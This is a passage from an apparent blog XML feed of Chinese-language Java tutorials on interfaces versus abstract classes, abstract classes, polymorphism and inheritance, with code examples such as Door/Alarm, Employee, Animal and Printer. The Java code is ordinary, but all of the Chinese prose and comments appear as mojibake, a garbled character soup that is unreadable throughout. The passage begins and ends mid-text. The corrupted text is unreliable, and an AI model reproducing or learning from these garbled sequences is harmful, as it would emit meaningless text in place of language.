PricipleÔºâÔºåÂú®DoorÁöÑÂÆö‰πâ‰∏≠ÊääDoorÊ¶ÇÂøµÊú¨Ë∫´Âõ∫ÊúâÁöÑË°å‰∏∫ÊñπÊ≥ïÂíåÂè¶Â§ñ‰∏Ä‰∏™Ê¶ÇÂøµ&quot;Êä•Ë≠¶Âô®&quot;ÁöÑË°å‰∏∫ÊñπÊ≥ïÊ∑∑Âú®‰∫Ü‰∏ÄËµ∑„ÄÇËøôÊ†∑ÂºïËµ∑ÁöÑ‰∏Ä‰∏™ÈóÆÈ¢òÊòØÈÇ£‰∫õ‰ªÖ‰ªÖ‰æùËµñ‰∫éDoorËøô‰∏™Ê¶ÇÂøµÁöÑÊ®°Âùó‰ºöÂõ†‰∏∫&quot;Êä•Ë≠¶Âô®&quot;Ëøô‰∏™Ê¶ÇÂøµÁöÑÊîπÂèòÔºàÊØîÂ¶ÇÔºö‰øÆÊîπalarmÊñπÊ≥ïÁöÑÂèÇÊï∞ÔºâËÄåÊîπÂèòÔºåÂèç‰πã‰æùÁÑ∂„ÄÇ//---------------------------------------------------------//‰ª•‰∏ãÊòØÊ≠£Á°ÆÁöÑ/*Êó¢ÁÑ∂open„ÄÅcloseÂíåalarmÂ±û‰∫é‰∏§‰∏™‰∏çÂêåÁöÑÊ¶ÇÂøµÔºåÊ†πÊçÆISPÂéüÂàôÂ∫îËØ•ÊääÂÆÉ‰ª¨ÂàÜÂà´ÂÆö‰πâÂú®‰ª£Ë°®Ëøô‰∏§‰∏™Ê¶ÇÂøµÁöÑÊäΩË±°Á±ª‰∏≠„ÄÇÂÆö‰πâÊñπÂºèÊúâÔºöËøô‰∏§‰∏™Ê¶ÇÂøµÈÉΩ‰ΩøÁî®abstract classÊñπÂºèÂÆö‰πâÔºõ‰∏§‰∏™Ê¶ÇÂøµÈÉΩ‰ΩøÁî®interfaceÊñπÂºèÂÆö‰πâÔºõ‰∏Ä‰∏™Ê¶ÇÂøµ‰ΩøÁî®abstract classÊñπÂºèÂÆö‰πâÔºåÂè¶‰∏Ä‰∏™Ê¶ÇÂøµ‰ΩøÁî®interfaceÊñπÂºèÂÆö‰πâ„ÄÇÊòæÁÑ∂ÔºåÁî±‰∫éJavaËØ≠Ë®Ä‰∏çÊîØÊåÅÂ§öÈáçÁªßÊâøÔºåÊâÄ‰ª•‰∏§‰∏™Ê¶ÇÂøµÈÉΩ‰ΩøÁî®abstract classÊñπÂºèÂÆö‰πâÊòØ‰∏çÂèØË°åÁöÑ„ÄÇÂêéÈù¢‰∏§ÁßçÊñπÂºèÈÉΩÊòØÂèØË°åÁöÑÔºå‰ΩÜÊòØÂØπ‰∫éÂÆÉ‰ª¨ÁöÑÈÄâÊã©Âç¥ÂèçÊò†Âá∫ÂØπ‰∫éÈóÆÈ¢òÈ¢ÜÂüü‰∏≠ÁöÑÊ¶ÇÂøµÊú¨Ë¥®ÁöÑÁêÜËß£„ÄÅÂØπ‰∫éËÆæËÆ°ÊÑèÂõæÁöÑÂèçÊò†ÊòØÂê¶Ê≠£Á°Æ„ÄÅÂêàÁêÜ„ÄÇÊàë‰ª¨‰∏Ä‰∏ÄÊù•ÂàÜÊûê„ÄÅËØ¥Êòé„ÄÇÂ¶ÇÊûú‰∏§‰∏™Ê¶ÇÂøµÈÉΩ‰ΩøÁî®interfaceÊñπÂºèÊù•ÂÆö‰πâÔºåÈÇ£‰πàÂ∞±ÂèçÊò†Âá∫‰∏§‰∏™ÈóÆÈ¢òÔºö1„ÄÅÊàë‰ª¨ÂèØËÉΩÊ≤°ÊúâÁêÜËß£Ê∏ÖÊ•öÈóÆÈ¢òÈ¢ÜÂüüÔºåAlarmDoorÂú®Ê¶ÇÂøµÊú¨Ë¥®‰∏äÂà∞Â∫ïÊòØDoorËøòÊòØÊä•Ë≠¶Âô®Ôºü2„ÄÅÂ¶ÇÊûúÊàë‰ª¨ÂØπ‰∫éÈóÆÈ¢òÈ¢ÜÂüüÁöÑÁêÜËß£Ê≤°ÊúâÈóÆÈ¢òÔºåÊØîÂ¶ÇÔºöÊàë‰ª¨ÈÄöËøáÂØπ‰∫éÈóÆÈ¢òÈ¢ÜÂüüÁöÑÂàÜÊûêÂèëÁé∞AlarmDoorÂú®Ê¶ÇÂøµÊú¨Ë¥®‰∏äÂíåDoorÊòØ‰∏ÄËá¥ÁöÑÔºåÈÇ£‰πàÊàë‰ª¨Âú®ÂÆûÁé∞Êó∂Â∞±Ê≤°ÊúâËÉΩÂ§üÊ≠£Á°ÆÁöÑÊè≠Á§∫Êàë‰ª¨ÁöÑËÆæËÆ°ÊÑèÂõæÔºåÂõ†‰∏∫Âú®Ëøô‰∏§‰∏™Ê¶ÇÂøµÁöÑÂÆö‰πâ‰∏äÔºàÂùá‰ΩøÁî®interfaceÊñπÂºèÂÆö‰πâÔºâÂèçÊò†‰∏çÂá∫‰∏äËø∞Âê´‰πâ„ÄÇÂ¶ÇÊûúÊàë‰ª¨ÂØπ‰∫éÈóÆÈ¢òÈ¢ÜÂüüÁöÑÁêÜËß£ÊòØÔºöAlarmDoorÂú®Ê¶ÇÂøµÊú¨Ë¥®‰∏äÊòØDoorÔºåÂêåÊó∂ÂÆÉÊúâÂÖ∑ÊúâÊä•Ë≠¶ÁöÑÂäüËÉΩ„ÄÇÊàë‰ª¨ËØ•Â¶Ç‰ΩïÊù•ËÆæËÆ°„ÄÅÂÆûÁé∞Êù•ÊòéÁ°ÆÁöÑÂèçÊò†Âá∫Êàë‰ª¨ÁöÑÊÑèÊÄùÂë¢ÔºüÂâçÈù¢Â∑≤ÁªèËØ¥ËøáÔºåabstract classÂú®JavaËØ≠Ë®Ä‰∏≠Ë°®Á§∫‰∏ÄÁßçÁªßÊâøÂÖ≥Á≥ªÔºåËÄåÁªßÊâøÂÖ≥Á≥ªÂú®Êú¨Ë¥®‰∏äÊòØ&quot;is a&quot;ÂÖ≥Á≥ª„ÄÇÊâÄ‰ª•ÂØπ‰∫éDoorËøô‰∏™Ê¶ÇÂøµÔºåÊàë‰ª¨Â∫îËØ•‰ΩøÁî®abstarct classÊñπÂºèÊù•ÂÆö‰πâ„ÄÇÂè¶Â§ñÔºåAlarmDoorÂèàÂÖ∑ÊúâÊä•Ë≠¶ÂäüËÉΩÔºåËØ¥ÊòéÂÆÉÂèàËÉΩÂ§üÂÆåÊàêÊä•Ë≠¶Ê¶ÇÂøµ‰∏≠ÂÆö‰πâÁöÑË°å‰∏∫ÔºåÊâÄ‰ª•Êä•Ë≠¶Ê¶ÇÂøµÂèØ‰ª•ÈÄöËøáinterfaceÊñπÂºèÂÆö‰πâ„ÄÇÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö*/abstract class Door {        abstract void open();        abstract void close()Ôºõ    }interface Alarm {    void alarm();}class AlarmDoor extends Door implements Alarm {    void open() { ‚Ä¶ }    void close() { ‚Ä¶ }    void alarm() { ‚Ä¶ }}/*ËøôÁßçÂÆûÁé∞ÊñπÂºèÂü∫Êú¨‰∏äËÉΩÂ§üÊòéÁ°ÆÁöÑÂèçÊò†Âá∫Êàë‰ª¨ÂØπ‰∫éÈóÆÈ¢òÈ¢ÜÂüüÁöÑÁêÜËß£ÔºåÊ≠£Á°ÆÁöÑÊè≠Á§∫Êàë‰ª¨ÁöÑËÆæËÆ°ÊÑèÂõæ„ÄÇÂÖ∂ÂÆûabstract classË°®Á§∫ÁöÑÊòØ&quot;is a&quot;ÂÖ≥Á≥ªÔºåinterfaceË°®Á§∫ÁöÑÊòØ&quot;like a&quot;ÂÖ≥Á≥ªÔºåÂ§ßÂÆ∂Âú®ÈÄâÊã©Êó∂ÂèØ‰ª•‰Ωú‰∏∫‰∏Ä‰∏™‰æùÊçÆÔºåÂΩìÁÑ∂ËøôÊòØÂª∫Á´ãÂú®ÂØπÈóÆÈ¢òÈ¢ÜÂüüÁöÑÁêÜËß£‰∏äÁöÑÔºåÊØîÂ¶ÇÔºöÂ¶ÇÊûúÊàë‰ª¨ËÆ§‰∏∫AlarmDoorÂú®Ê¶ÇÂøµÊú¨Ë¥®‰∏äÊòØÊä•Ë≠¶Âô®ÔºåÂêåÊó∂ÂèàÂÖ∑ÊúâDoorÁöÑÂäüËÉΩÔºåÈÇ£‰πà‰∏äËø∞ÁöÑÂÆö‰πâÊñπÂºèÂ∞±Ë¶ÅÂèçËøáÊù•‰∫Ü„ÄÇ*/</code></pre><p>abstract<br>classÂíåinterfaceÊòØJavaËØ≠Ë®Ä‰∏≠ÁöÑ‰∏§ÁßçÂÆö‰πâÊäΩË±°Á±ªÁöÑÊñπÂºèÔºåÂÆÉ‰ª¨‰πãÈó¥ÊúâÂæàÂ§ßÁöÑÁõ∏‰ººÊÄß„ÄÇ‰ΩÜÊòØÂØπ‰∫éÂÆÉ‰ª¨ÁöÑÈÄâÊã©Âç¥ÂèàÂæÄÂæÄÂèçÊò†Âá∫ÂØπ‰∫éÈóÆÈ¢òÈ¢ÜÂüü‰∏≠ÁöÑÊ¶ÇÂøµÊú¨Ë¥®ÁöÑÁêÜËß£„ÄÅÂØπ‰∫éËÆæËÆ°ÊÑèÂõæÁöÑÂèçÊò†ÊòØÂê¶Ê≠£Á°Æ„ÄÅÂêàÁêÜÔºåÂõ†‰∏∫ÂÆÉ‰ª¨Ë°®Áé∞‰∫ÜÊ¶ÇÂøµÈó¥ÁöÑ‰∏çÂêåÁöÑÂÖ≥Á≥ªÔºàËôΩÁÑ∂ÈÉΩËÉΩÂ§üÂÆûÁé∞ÈúÄÊ±ÇÁöÑÂäüËÉΩÔºâ„ÄÇËøôÂÖ∂ÂÆû‰πüÊòØËØ≠Ë®ÄÁöÑ‰∏ÄÁßçÁöÑÊÉØÁî®Ê≥ïÔºåÂ∏åÊúõËØªËÄÖÊúãÂèãËÉΩÂ§üÁªÜÁªÜ‰Ωì‰ºö„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaÊäΩË±°Á±ª</title>
      <link href="/2016/11/23/java%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
      <url>/2016/11/23/java%E6%8A%BD%E8%B1%A1%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p><em>Â≠¶‰π†Ëá™ËÅåÂùêÊ†á,‰ª•‰∏ã‰ª£Á†ÅÂ§ßÈÉ®ÂàÜÂ±û‰∫é</em><br>1.‰ª£Á†ÅËß£Èáä</p><pre><code>package Abstract;public class EmployeeDemo {    public static void main(String[] args) {        JavaTeacher teacher = new JavaTeacher(10, &quot;Âº†‰∏â&quot;, 10000);        teacher.work();        teacher.aa();        Leader leader = new Leader(11,&quot;boss&quot;,10000,10000);        leader.work();        //Employee emp = new Employee(10,&quot;hello&quot;,1000);        //Cannot instantiate the type EmployeeÊó†Ê≥ïÂÆû‰æãÂåñÁöÑÁ±ªÂûãÁöÑÂëòÂ∑•        /*         * ‰∏Ä‰∏ãÂÜÖÂÆπÈÄöËøáÂ§öÊÄÅ         * */        System.out.println(&quot;----------------------------------&quot;);        System.out.println(&quot;‰∏Ä‰∏ãÊ∂âÂèäÂ§öÊÄÅ&quot;);        Employee employee1 = new JavaTeacher(10, &quot;Âº†‰∏â&quot;, 10000);        employee1.work();        Employee employee2 = new Leader(11,&quot;boss&quot;,10000,10000);        employee2.work();        //leader1.more();        //The method more() is undefined for the type Employee        if(employee2 instanceof Leader){            System.out.println(&quot;ÊÅ≠Âñú‰Ω†,ÂèØ‰ª•Âêë‰∏ãËΩ¨Âûã&quot;);            Leader lead = (Leader)employee2;            //ÂèØ‰ª•ÂÆûÁé∞leadÁâπÊúâÁöÑÊñπÊ≥ï            lead.more();            //ÂÆ≥ÁöÑÊàëËµ∂Á¥ßÁúãÁúãÊàëÁöÑÊ¥•Ë¥¥ÊúâÊ≤°Êúâ‰∏¢Â§±            lead.getAllowance();        }    }}//ÊäΩË±°Á±ª(‰∏ÄÊó¶‰∏Ä‰∏™Á±ªÊúâÊäΩË±°ÊñπÊ≥ï,ÈÇ£Ëøô‰∏™Á±ªÂ∞±ÊòØÊäΩË±°Á±ª)//‰ΩÜÊäΩË±°Á±ª‰∏≠‰πüÂèØËÉΩÊúâÂÖ∑‰ΩìÁöÑÊñπÊ≥ïabstract class Employee{    private int number;    private String name;    private double salary;    public Employee(int number,String name,double salary){        this.number = number;        this.name = name;        this.salary = salary;    }    //ÊäΩË±°ÊñπÊ≥ï    public abstract void work();//Ê≥®ÊÑèÊäΩË±°ÊñπÊ≥ïÁöÑÂÜôÊ≥ï,Âè™ÊòØÂ£∞Êòé    public void aa(){        System.out.println(&quot; say hello&quot;);    }}//‰∏ÄÊó¶‰∏Ä‰∏™Á±ªÂéªÁªßÊâø‰∫ÜÊäΩË±°Á±ª,ÈÇ£‰πàËøô‰∏™Á±ªÂ∞±Ë¶Å‰πàÂÆûÁé∞ÊäΩË±°Á±ªÁöÑÊäΩË±°ÊñπÊ≥ï,Ë¶Å‰πàÁªßÁª≠ÊäΩË±°‰∏ãÂéªclass JavaTeacher extends Employee{    public JavaTeacher(int number, String name, double salary) {        super(number, name, salary);    }    @Override    public void work(){        System.out.println(&quot;‰∏äJavaËØæ&quot;);    }}class Leader extends Employee{    private double allowance;//ÁâπÊúâÂ±ûÊÄßÊ¥•Ë¥¥    public Leader(int number, String name, double salary,double allowance) {        super(number, name, salary);        this.allowance = allowance;    }    public void getAllowance(){        System.out.println(allowance);    }    @Override    public void work(){        System.out.println(&quot;ÂüπËÆ≠Êñ∞ÂëòÂ∑•&quot;);        System.out.println(&quot;ËÆæËÆ°ËØæÁ®ã‰ΩìÁ≥ª&quot;);    }    public void more(){        System.out.println(&quot;ÁõëÁÆ°&quot;);    }}</code></pre><hr><pre><code>1./*Âè™Ë¶ÅÊúâÊäΩË±°ÊñπÊ≥ï,Â∞±ÊòØÊäΩË±°Á±ª,ÊäΩË±°Á±ª‰∏≠‰πüÂèØ‰ª•Â≠òÂú®ÂÖ∑‰ΩìÊñπÊ≥ï*///ÊäΩË±°Á±ª(‰∏ÄÊó¶‰∏Ä‰∏™Á±ªÊúâÊäΩË±°ÊñπÊ≥ï,ÈÇ£Ëøô‰∏™Á±ªÂ∞±ÊòØÊäΩË±°Á±ª)//‰ΩÜÊäΩË±°Á±ª‰∏≠‰πüÂèØËÉΩÊúâÂÖ∑‰ΩìÁöÑÊñπÊ≥ïabstract class Employee{    private int number;    private String name;    private double salary;    public Employee(int number,String name,double salary){        this.number = number;        this.name = name;        this.salary = salary;    }    //ÊäΩË±°ÊñπÊ≥ï    public abstract void work();//Ê≥®ÊÑèÊäΩË±°ÊñπÊ≥ïÁöÑÂÜôÊ≥ï,Âè™ÊòØÂ£∞Êòé    public void aa(){        System.out.println(&quot; say hello&quot;);    }}2.Â≠êÁ±ªÁªßÊâøÊäΩË±°Á±ª,ÂøÖÈ°ªÂÆûÁé∞ÊäΩË±°Áà∂Á±ªÁöÑÊäΩË±°ÊñπÊ≥ï,@Override.Èô§‰∫Ü‰ª•‰∏ä,Â≠êÁ±ªËøòÂèØ‰ª•ÊúâÂÖ∂ÁâπÂÆöÁöÑÊñπÊ≥ï</code></pre><hr><pre><code>ÊäΩË±°Á±ªÂíåÊôÆÈÄöÁ±ªÁöÑÂå∫Âà´,ÊäΩË±°Á±ªÁöÑÊäΩË±°ÊñπÊ≥ïÔºåÂ≠êÁ±ªÂøÖÈ°ªÂÆûÁé∞„ÄÇÊØîÂ¶ÇÁà∂Á±ªÊúâÁöÑÊñπÊ≥ïÂú®ËÆæËÆ°Êó∂ÔºåÂπ∂‰∏çÁü•ÈÅìËØ•ÊÄé‰πàÂÜôÔºåËÄåË¶ÅÁïôÁªôÂ≠êÁ±ªÂéªÂÆûÁé∞Ôºå‰ΩÜÂèàÂøÖÈ°ªÂÆûÁé∞„ÄÇËøôÊ†∑ÁöÑÂº∫Âà∂ÊÄßÊòØÊôÆÈÄöÁ±ªÊâÄ‰∏çÂÖ∑Â§áÁöÑhttp://www.blogjava.net/wintys/archive/2009/06/15/pattern_template_method.html[‰ª•‰∏äÂÜÖÂÆπÊù•Ëá™](https://q.cnblogs.com/q/48158/)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaÂ§öÊÄÅ</title>
      <link href="/2016/11/21/java%E5%A4%9A%E6%80%81/"/>
      <url>/2016/11/21/java%E5%A4%9A%E6%80%81/</url>
      
        <content type="html"><![CDATA[<p><strong>Â§öÊÄÅÊÄß:Â§öÁßçË°å‰∏∫</strong></p><p><em>Â≠¶‰π†‰∫éËÅåÂùêÊ†á,‰ª•‰∏ã‰ª£Á†ÅÂÖ®ÈÉ®ËæπÁúãËßÜÈ¢ëËæπÊï≤,Â∫îËØ•‰∏çÁÆóÊäÑË¢≠Âà´‰∫∫Áü•ËØÜ‰∫ßÊùÉ</em></p><pre><code>package ploy;public class AnimalDemo {    public static void main(String[] args) {        //Áà∂Á±ªÁöÑÂºïÁî®ÂèòÈáèÂèØ‰ª•ÂºïÁî®ÂÖ∂Â≠êÁ±ªÁöÑÂØπË±°        Animal animal1=new Dog(&quot;wangcai&quot;);//Âêë‰∏äËΩ¨Âûã//‰∏äÊòØÊåáÂ≠êÁ±ªËΩ¨ÊàêÁà∂Á±ª,ÂèØËÉΩ‰ºö‰∏¢Â§±ÊñπÊ≥ï        animal1.eat();        //animal1.hh()//ËøôÂ∞±ÊòØ‰∏¢Â§±ÊñπÊ≥ï,,Êó†Ê≥ïË∞ÉÁî®hh()        //Âêë‰∏äËΩ¨ÂûãÈ¶ñÂÖàÊòØÂÆâÂÖ®ÁöÑ,ÂΩìÂèØËÉΩ‰ºöÂØºËá¥Â≠êÁ±ªÊñπÊ≥ïÁöÑ‰∏¢Â§±        //Áà∂Á±ªÁöÑÂºïÁî®ÂèòÈáè,Âè™ËÉΩË∞ÉÁî®Áà∂Á±ª‰∏≠ÊúâÁöÑÊñπÊ≥ïÊàñÂ≠êÁ±ªÈáçÂÜôÁà∂Á±ªÁöÑÊñπÊ≥ï        Animal animal2=new Cat(&quot;zhaocaimiao&quot;);        animal2.eat();        /*Â§öÊÄÅÂ≠òÂú®ÁöÑ‰∏â‰∏™ÂøÖË¶ÅÊù°‰ª∂         * 1.ÈúÄË¶ÅÂ≠òÂú®ÁªßÊâøÂíåÂÆûÁé∞ÂÖ≥Á≥ª         * 2.ÂêåÊ†∑ÁöÑÊñπÊ≥ïË∞ÉÁî®‰∫åÊâßË°å‰∏çÂêåÊìç‰Ωú,ËøêË°å‰∏çÂêå‰ª£Á†Å(ÈáçÂÜôÊìç‰Ωú)         * 3.Âú®ËøêË°åÊó∂Áà∂Á±ªÊàñËÄÖÊé•Âè£ÁöÑÂºïÁî®ÂèòÈáèÂèØ‰ª•ÂºïÁî®ÂÖ∂Â≠êÁ±ªÁöÑÂØπË±°         * */        //Âêë‰∏ãËΩ¨ÂûãÊòØ‰∏çÂÆâÂÖ®ÁöÑ        //1./*Cat cat = (Cat)animal1;*/// java.lang.ClassCastException//Á±ªÂûãËΩ¨Êç¢ÈîôËØØ        /*instanceof         * result = object instanceof class         * ÂÖ∏Âûã‰ΩøÁî®Âú∫Âêà         * Âú®ÂØπÂØπË±°ÂÅöÂêë‰∏ãËΩ¨Âûã‰πãÂâç,Ê≤°ÊúâÂÖ∂‰ªñÊúâÂÖ≥ÂØπË±°Á±ªÂûã‰ø°ÊÅØÊó∂,Âä°ÂøÖ‰ΩøÁî®instanceof Êù•Âà§Êñ≠‰∏Ä‰∏ã,ÈÅøÂÖçÊäõÂá∫ClassCastException         *          *         */        //Ê≠£Á°ÆÁöÑÂÅöÊ≥ï        if(animal1 instanceof Cat){//Âπ∂Ê≤°ÊúâÊâßË°å            System.out.println(&quot;hello1&quot;);            Cat cat=(Cat)animal1;        }        if(animal2 instanceof Cat){            System.out.println(&quot;hello2&quot;);            Cat cat=(Cat)animal2;            cat.hh();//Ê≠§Êó∂ÂèØ‰ª•ÊâßË°åÂ≠êÁ±ªÁâπÊúâÁöÑÊñπÊ≥ï        }        //ÈùôÊÄÅÁªëÂÆö:final,static,privateÂíåÊûÑÈÄ†ÊñπÊ≥ï,Âú®ÊâßË°åÂâçÂ∑≤ÁªèÁªëÂÆö,Ëøô‰∫õÊñπÊ≥ïÊòØ‰∏çÂèØ‰ª•‰øÆÊîπÁöÑ        //Âä®ÊÄÅÁªëÂÆö:Person p=new Teacher();p.sayHi();    }}class Animal{    private String name;    public Animal(String name){        this.name = name;    }    public void eat(){//ËøôÊòØ‰∏Ä‰∏™ÈÄöÁî®ÁöÑÊñπÊ≥ï,ÈÄöÁî®ÊñπÊ≥ïÂÆûÁé∞Ê≤°ÊúâÂ§™Â§ßÁöÑÊÑè‰πâ    }}class Dog extends Animal{    public Dog(String name){        super(name);    }    public void hh(){        System.out.println(&quot;nihai&quot;);    }    //ÂØπÁà∂Á±ªÁöÑÊñπÊ≥ïÁöÑÈáçÂÜô    @Override    public void eat(){        System.out.println(&quot;ÂïÉÈ™®Â§¥&quot;);    }}class Cat extends Animal{    public Cat(String name){        super(name);    }    public void hh(){        System.out.println(&quot;nihai&quot;);    }    //ÂØπÁà∂Á±ªÁöÑÊñπÊ≥ïÁöÑÈáçÂÜô    @Override    public void eat(){        System.out.println(&quot;ÂêÉÈ±ºËÇâ&quot;);    }}</code></pre><hr><p><strong>ÂØπ‰∏äÈù¢ÁöÑËß£Èáä</strong></p><pre><code>1./*Â§öÊÄÅÂ≠òÂú®ÁöÑ‰∏â‰∏™ÂøÖË¶ÅÊù°‰ª∂      * 1.ÈúÄË¶ÅÂ≠òÂú®ÁªßÊâøÂíåÂÆûÁé∞ÂÖ≥Á≥ª         * 2.ÂêåÊ†∑ÁöÑÊñπÊ≥ïË∞ÉÁî®‰∫åÊâßË°å‰∏çÂêåÊìç‰Ωú,ËøêË°å‰∏çÂêå‰ª£Á†Å(ÈáçÂÜôÊìç‰Ωú)         * 3.Âú®ËøêË°åÊó∂Áà∂Á±ªÊàñËÄÖÊé•Âè£ÁöÑÂºïÁî®ÂèòÈáèÂèØ‰ª•ÂºïÁî®ÂÖ∂Â≠êÁ±ªÁöÑÂØπË±°         * */2./*ÂàÜ‰∏∫Âêë‰∏äÂêë‰∏ãËΩ¨Âûã    (1)Âêë‰∏äËΩ¨Âûã:Animal animal1=new Dog(&quot;wangcai&quot;);ËøôÊ†∑‰ºö‰∏¢Â§±ÂèòÈáèÂíåÊñπÊ≥ï,Âè™ËÉΩ‰ΩøÁî®Áà∂Á±ªÁöÑÂ∑≤ÁªèÂ≠òÂú®ÁöÑÂèòÈáèÂíåË¢´Â≠êÁ±ªÈáçÂÜôÁöÑÊñπÊ≥ï.    (2)Âêë‰∏ãËΩ¨Âûã:Ëß£ÂÜ≥Âêë‰∏äËΩ¨ÂûãÁöÑÁ°ÆÂÆö,‰ΩÜÊòØ‰∏çÂÆâÂÖ®ÁöÑ    /*Cat cat = (Cat)animal1;*/ÊØîÂ¶ÇËøôÂè•ËØù,ÊòéÊòéanimalÊòØdogÂûãÁöÑ,ËøôÊ†∑Âº∫ËΩ¨Â∞±‰ºöÊä•Èîô    instanceof         * result = object instanceof class         * ÂÖ∏Âûã‰ΩøÁî®Âú∫Âêà         * Âú®ÂØπÂØπË±°ÂÅöÂêë‰∏ãËΩ¨Âûã‰πãÂâç,Ê≤°ÊúâÂÖ∂‰ªñÊúâÂÖ≥ÂØπË±°Á±ªÂûã‰ø°ÊÅØÊó∂,Âä°ÂøÖ‰ΩøÁî®instanceof Êù•Âà§Êñ≠‰∏Ä‰∏ã,ÈÅøÂÖçÊäõÂá∫ClassCastException         *     (3)Âêë‰∏ãËΩ¨ÂûãÊó∂,ÂèØ‰ª•ÂÖ∑‰ΩìÂÆûÁé∞Â≠êÁ±ª‰∏≠ÁâπÊúâÁöÑÊñπÊ≥ï(Áà∂Á±ªÊ≤°Êúâ)    //Ê≠£Á°ÆÁöÑÂÅöÊ≥ï        if(animal1 instanceof Cat){//Âπ∂Ê≤°ÊúâÊâßË°å            System.out.println(&quot;hello1&quot;);            Cat cat=(Cat)animal1;        }        if(animal2 instanceof Cat){            System.out.println(&quot;hello2&quot;);            Cat cat=(Cat)animal2;            cat.hh();//Ê≠§Êó∂ÂèØ‰ª•ÊâßË°åÂ≠êÁ±ªÁâπÊúâÁöÑÊñπÊ≥ï        }x        */</code></pre><p><strong>ÂÖ∑‰ΩìÂÆû‰æã</strong></p><p><em>Ë¶ÅÊ±Ç:</em></p><ol><li>Â≠¶Ê†°Ë¶ÅÂÆâË£ÖÊâìÂç∞Êú∫ </li><li>ÊâìÂç∞Êú∫ÊúâÂæàÂ§öÁßç </li></ol><pre><code>public class PrinterDemo {    public static void main(String[] args) {//      ColorPrinter cp = new ColorPrinter(&quot;huipu&quot;);//      School school = new School();//      school.setColorPrinter(cp);//          Printer p=new ColorPrinter(&quot;huipu&quot;);        School school = new School();        school.setPrinter(p);        school.print(&quot;hello,java&quot;);    }}//ÂºÄÈó≠ÂéüÂàô:ÂØπ‰øÆÊîπÊòØÂ∞ÅÈó≠ÁöÑ,ÂØπÊâ©Â±ïÊòØÂºÄÊîæÁöÑclass School{/*    private ColorPrinter cp=null;    private BlackPrinter bp=null;    //ÂÆâË£ÖÂΩ©Ëâ≤ÊâìÂç∞Êú∫    public void setColorPrinter(ColorPrinter cp){        this.cp = cp;    }    //ÂÆâË£ÖÈªëÁôΩÊâìÂç∞Êú∫    public void setBlackPrinter(BlackPrinter bp){        this.bp=bp;    }    //print    public void print(String content){        //‰∫§Áªô‰∏≠ÂøÉÊâìÂç∞Êú∫ÊâìÂç∞        cp.print(content);    }*/    private Printer p=null;    //ÊãøÁà∂Á±ªÁöÑÂºïÁî®ÂèòÈáè‰Ωú‰∏∫ÂèÇÊï∞,Â•ΩÂ§ÑÂ∞±ÊòØÂèØ‰ª•Êé•Âèó‰ªª‰ΩïÂÖ∂‰ªñÂ≠êÁ±ªÁöÑÂØπË±°    //Ë∂äÊòØÊäΩË±°ÁöÑ‰∏úË•ø‰ª£Ë°®Ë∂äÁ®≥ÂÆö    public void setPrinter(Printer p){        this.p=p;    }     public void print(String content){        p.print(content);    }}class Printer{    private String brand;    public String getBrand(){        return brand;    }    public Printer(String brand){        this.brand=brand;    }    //ËÆ©Â≠êÁ±ªÂéªÂÖ∑‰ΩìÂÆûÁé∞    public void print(String content){    }}class ColorPrinter extends Printer{    public ColorPrinter(String brand){        super(brand);    }    @Override    public void print(String content){        System.out.println(getBrand()+&quot;ÂΩ©Ëâ≤ÊâìÂç∞:&quot;+content);    }}class BlackPrinter extends Printer{    public BlackPrinter(String brand){        super(brand);    }    @Override    public void print(String content){        System.out.println(super.getBrand()+&quot;ÈªëÁôΩÊâìÂç∞:&quot;+content);    }}class zhenPrinter extends Printer{    public zhenPrinter(String brand){        super(brand);    }    @Override    public void print(String content){        System.out.println(super.getBrand()+&quot;ÈíàÂºèÊâìÂç∞:&quot;+content);    }}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
            <tag> Â§öÊÄÅ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaÁªßÊâø</title>
      <link href="/2016/11/17/java%E7%BB%A7%E6%89%BF/"/>
      <url>/2016/11/17/java%E7%BB%A7%E6%89%BF/</url>
      
        <content type="html"><![CDATA[<p>ÊúÄËøëÈáçÊñ∞Â§ç‰π†‰∫ÜÁªßÊâø,ÊØîÁ¨¨‰∏ÄÊ¨°ÊúâÊõ¥Ê∑±ÁöÑ‰∫ÜËß£,Ê∏©ÊïÖËÄåÁü•Êñ∞.<br><strong>1.ÁªßÊâøÂü∫Êú¨,super,Override</strong></p><pre><code>public class TeacherDemo {    public static void main(String[] args) {        JavaTeacher jteacher=new JavaTeacher(&quot;zhangsan&quot;, &quot;jiaoda&quot;);        DBTeacher dteacher=new DBTeacher(&quot;nihao&quot;, &quot;phk&quot;);        jteacher.teaching();        dteacher.teaching();    }}class Teacher{    private String name;    private String school;    public Teacher(String name,String school){        this.name=name;        this.school=school;    }    public void teaching(){        System.out.println(&quot;ÊéàËØæÈí±ÂáÜÂ§á&quot;);    }}class JavaTeacher extends Teacher{    public JavaTeacher(String name,String school){        super(name, school);    }    @Override    public void teaching(){//Ê≠§Êó∂Êó†Ê≥ïË∞ÉÁî®Áà∂Á±ª,ÂèØ‰ª•super        super.teaching();        System.out.println(&quot;eclipse&quot;);    }}class DBTeacher extends Teacher{    public DBTeacher(String name,String school){        super(name, school);    }    @Override    public void teaching(){        super.teaching();        System.out.println(&quot;sql&quot;);    